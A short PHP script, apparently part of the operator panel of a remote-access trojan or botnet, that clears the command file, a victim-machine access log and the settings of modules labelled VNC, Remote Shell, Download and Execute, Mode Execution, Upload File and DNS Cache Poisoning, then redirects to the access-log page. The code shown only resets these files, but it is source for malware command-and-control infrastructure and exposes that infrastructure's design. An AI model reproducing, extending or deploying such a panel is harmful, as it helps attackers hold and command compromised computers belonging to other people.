<?php

// Zera arquivo global...
$buf = "[UID]\nUID=\nMASTER=\n\n[CMD]\nCMD=";
$arq = fopen("databases/cmd.ini", "w");
$grv = fwrite($arq, $buf);
fclose($arq);

// Zera arquivo de logs...
$buf = " ";
$arq = fopen("acessos/maquinas/access_log.txt", "w");
$grv = fwrite($arq, $buf);
fclose($arq);

// Zera módulo VNC...
$buf = "[IPX]\nIPTR=";
$arq = fopen("modulos/vncx/CTL.ini", "w");
$grv = fwrite($arq, $buf);
fclose($arq);

// Zera módulo Upload File...
$buf = "[UPLF]\nFLX=";
$arq = fopen("modulos/uploadfli/CTL.ini", "w");
$grv = fwrite($arq, $buf);
fclose($arq);

// Zera módulo Remote Shell...
$buf = "[CONEXAO]\nSTATUS=0\n\n[CMD]\nCMD=";
$arq = fopen("modulos/remotesx/midia/CTL.ini", "w");
$grv = fwrite($arq, $buf);
fclose($arq);

$buf = " ";
$arq = fopen("modulos/remotesx/midia/temp.txt", "w");
$grv = fwrite($arq, $buf);
fclose($arq);

// Zera módulo Mode Execution
$buf = "[MDX]\nID=1";
$arq = fopen("modulos/modeexec/CTL.ini", "w");
$grv = fwrite($arq, $buf);
fclose($arq);

// Zera módulo Download and Execute
$buf = "[UPLF]\nFLX=";
$arq = fopen("modulos/dowexec/CTL.ini", "w");
$grv = fwrite($arq, $buf);
fclose($arq);

// Zera módulo DNS Cache Poisoning
$buf = " ";
$arq = fopen("modulos/dnsmanager/midia/pac.pac", "w");
$grv = fwrite($arq, $buf);
fclose($arq);

header("Location: accesslog.php");
?>